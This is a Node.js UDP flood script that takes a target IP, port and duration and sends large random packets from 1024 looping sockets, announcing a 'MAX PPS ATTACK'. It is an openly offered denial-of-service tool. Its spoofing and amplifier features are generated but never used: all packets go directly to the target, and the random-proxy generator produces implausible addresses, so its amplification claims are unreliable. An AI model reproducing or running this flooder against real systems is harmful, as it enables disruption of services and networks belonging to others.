const dgram = require("dgram");
const fs = require("fs");

if (process.argv.length < 5) {
    console.log("Usage: node UDP-GBPS.js <IP_TARGET> <PORT_TARGET> <TIME>");
    process.exit(1);
}

const targetIp = process.argv[2];
const targetPort = parseInt(process.argv[3]);
const duration = parseInt(process.argv[4]) * 1000;
const startTime = Date.now();

const threads = 1024;
const interval = -1;

function generateSpoofedIP() {
    return `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
}

function generateRandomProxy() {
    const ip = Array(4).fill(0).map(() => Math.floor(Math.random() * 10)).join(".");
    const port = Math.floor(10000 + Math.random() * 55535);
    return `${ip}:${port}`;
}

const ampServers = fs.existsSync("amplifiers.txt") ? fs.readFileSync("amplifiers.txt", "utf8").split("\n").map(p => p.trim()).filter(Boolean) : [];

if (ampServers.length === 0) {
    console.log("⚠️ No amplifiers found! Generating random proxies...");
    for (let i = 0; i < 500; i++) {
        ampServers.push(generateRandomProxy());
    }
}

function generatePayload() {
    const size = Math.floor(Math.random() * 65507) + 1;
    return Buffer.alloc(size, Math.random().toString(36).substring(2));
}

console.log(`🔥 MAX PPS ATTACK to ${targetIp}:${targetPort} for ${process.argv[4]} seconds...`);
console.log(`🚀 Threads: ${threads} | Amplifiers/Proxies: ${ampServers.length}`);

let running = true;

function sendUdpAmplification() {
    const socket = dgram.createSocket("udp4");

    const attackLoop = setInterval(() => {
        if (!running || Date.now() - startTime > duration) {
            clearInterval(attackLoop);
            socket.close();
            console.log(`⏹️ Attack stopped.`);
            process.exit(0);
        }

        for (const ampServer of ampServers) {
            const spoofedIP = generateSpoofedIP();
            const randomPort = Math.floor(Math.random() * 65535);
            const payload = generatePayload();

            socket.send(payload, 0, payload.length, targetPort, targetIp, () => {});
        }
    }, interval);
}

for (let i = 0; i < threads; i++) {
    sendUdpAmplification();
}